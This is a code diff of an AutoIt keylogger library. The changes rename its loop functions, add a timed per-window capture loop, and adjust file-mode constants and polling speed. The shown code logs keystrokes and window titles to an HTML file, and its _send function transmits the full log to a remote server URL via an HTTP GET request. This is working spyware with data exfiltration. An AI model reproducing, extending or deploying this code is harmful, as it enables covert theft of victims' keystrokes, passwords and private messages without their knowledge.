@@ -32,7 +32,7 @@
 Global $key = ""			; The pressed Key
 Global $last = ""			; The pressed Key in the last iteration
 Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
-Global $wait_time = 35 		; The time to wait between iterations (in milliseconds)
+Global $wait_time = 22 		; The time to wait between iterations (in milliseconds)
 Global $file_path = ""		; The path of the file
 Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging
 
@@ -43,7 +43,7 @@ Func _init($path)
 	$Seperator = "\"
 	If not StringCompare($path, "") Then $Seperator = ""
 	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year ; The filename will result in something like this: 26_116_90630
-	Global $File = FileOpen($file_path, 1)
+	Global $File = FileOpen($file_path, $FO_APPEND)
 	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
 	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
@@ -55,7 +55,7 @@ Func _initWithFilename($path, $filename)
 	$Seperator = "\"
 	If not StringCompare($path, "") Then $Seperator = ""
 	$file_path = $path&$Seperator&$filename
-	Global $File = FileOpen($file_path, 1) ; The file
+	Global $File = FileOpen($file_path, $FO_APPEND) ; The file
 	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
 	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
@@ -415,14 +415,14 @@ Func _read()
 EndFunc
 
 ; An endless loop of reading (so the keylogger won't stop reading)
-Func _run()
+Func _readEndlessly()
    While 1
 	   _read()
 	WEnd
 EndFunc
 
 ; A loop with a fixed number of iterations (iterations * wait_time = runtime of the keylogger)
-Func _runFor($iterations)
+Func _readFor($iterations)
     For $i = 0 To $iterations Step 1
 	   _read()
 	Next
@@ -438,14 +438,21 @@ Func _readWindow($title)
 		EndIf
 EndFunc
 
+; Combination of readWindow and readFor
+Func _readWindowFor($title, $iterations)
+    For $i = 0 To $iterations Step 1
+	   _readWindow($title)
+	Next
+EndFunc
+
 ; Sends the content of the log to a server-URL via GET
 Func _send($url)
 	FileClose($File) 					; The File is still opened in writing-mode so it is closed to...
-	$File = FileOpen($file_path, 128)	; ...open in read-mode again
+	$File = FileOpen($file_path, $FO_UTF8)	; ...open in read-mode again
 	$content = FileRead($File)
-	InetRead($url & "?name=" & @ComputerName & "&content=" & $content) ; The name is needed to identify where the logs are coming from
+	InetRead($url & "?content=" & $content) ; The name is needed to identify where the logs are coming from
 	FileClose($File)
-	$File = FileOpen($file_path, 1)
+	$File = FileOpen($file_path, $FO_APPEND)
 EndFunc
 
 ; Deletes the log
